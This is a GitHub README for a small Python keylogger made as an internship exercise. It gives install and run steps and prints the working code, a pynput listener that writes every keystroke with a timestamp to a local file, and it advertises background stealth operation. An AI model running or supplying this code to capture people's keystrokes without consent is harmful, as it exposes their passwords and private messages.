# Simple Keylogger
This repository contains a simple keylogger developed as part of an internship task at Prodigy Infotech. The keylogger is designed to monitor and log keystrokes on a system for educational and security analysis purposes.

# Features
•Keystroke Logging: Records all keystrokes made on the system.

•Timestamped Entries: Each keystroke is logged with a timestamp.

•Stealth Operation: Runs in the background without drawing attention.

# Requirements

Python 3.x
Required Python libraries (listed in requirements.txt)

Installation

1) Clone the repository:
   
          git clone https://github.com/yourusername/simple-keylogger.git
          cd simple-keylogger

2) Install the required libraries:

         pip install -r requirements.txt

# Usage

1) Run the keylogger

        python keylogger.py

2) Stop the keylogger

    The keylogger can be stopped manually by closing the terminal or killing the process.
  
3) View the logs

    The logged keystrokes are saved in a file named keylog.txt in the same directory as the script.
  
# Code Overview

 • keylogger.py: The main script that sets up the keylogger and logs the keystrokes.
 
 • requirements.txt: Lists the required Python libraries for the keylogger to run.
 
# Keylogger Script (keylogger.py)

The keylogger script uses the pynput library to monitor and log keystrokes. Below is a high-level overview of the script:

1) Import Libraries

          from pynput.keyboard import Listener 
          import logging
   
3) Set Up Logging

        logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
   
5) Define Event Handlers

        def on_press(key):
            logging.info(str(key))
4) Start Listening

        with Listener(on_press=on_press) as listener:
            listener.join()
# Disclaimer

This keylogger is intended for educational purposes only. Unauthorized use of keyloggers is illegal and unethical. Ensure you have explicit permission from the owner of any system on which you use this keylogger. Prodigy Infotech and the author are not responsible for any misuse of this tool.

# Contributing

If you would like to contribute to this project, please fork the repository and submit a pull request.

# License

This project is licensed under the MIT License. See the LICENSE file for details.

# Contact

 For any questions or issues, please contact vsai17290@gmail.com.
